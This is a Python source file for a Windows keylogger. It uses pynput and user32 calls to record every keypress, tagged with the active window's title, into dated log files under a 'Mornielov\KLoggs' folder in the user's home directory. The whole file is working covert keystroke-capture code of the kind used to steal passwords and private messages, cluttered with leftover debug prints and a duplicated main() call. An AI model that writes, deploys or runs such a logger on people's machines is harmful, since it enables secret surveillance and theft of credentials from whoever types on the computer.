from ctypes import *
import logging
from time import gmtime, strftime
from os.path import expanduser
import os
from pynput.keyboard import Listener
from ctypes import windll, create_unicode_buffer


def main():

    home = expanduser("~")
    path2install = home + "\\Mornielov\\KLoggs\\" + strftime("%Y_%m_%d", gmtime())
    global now
    global last
    print("hhh")
    create()

    print("hello")
    print("creating...")
    if not os.path.exists(path2install):
        print("gonna create")
        os.makedirs(path2install)
        print("created")
    else:
        print(path2install + " already exists")

    path = home + "\\Mornielov\\KLoggs\\" + strftime("%Y_%m_%d", gmtime()) + "\\" + strftime("%Y-%m-%d",
                                                                                            gmtime()) + '_logk.txt'
    file_log = path
    current_window = None
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')

    now = ""
    last = ""

    with Listener(on_press=capt) as c:
        c.join()


def returnWindowTitle():
    hWnd = windll.user32.GetForegroundWindow()
    length = windll.user32.GetWindowTextLengthW(hWnd)
    buf = create_unicode_buffer(length + 1)
    windll.user32.GetWindowTextW(hWnd, buf, length + 1)
    return buf.value



def create():
    print("old")

def capt(key):
    global now
    global last
    now = returnWindowTitle()
    tecla = str(key)
    tecla = tecla.replace("'", "")

    if now != last:
        print("1")
        logging.log(10, "[" + now + "]")
        logging.log(10, tecla)
        last = now
    else:
        print(0)
        logging.log(10, tecla)
        last = now

    return True



main()


if __name__ == '__main__':

    main()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
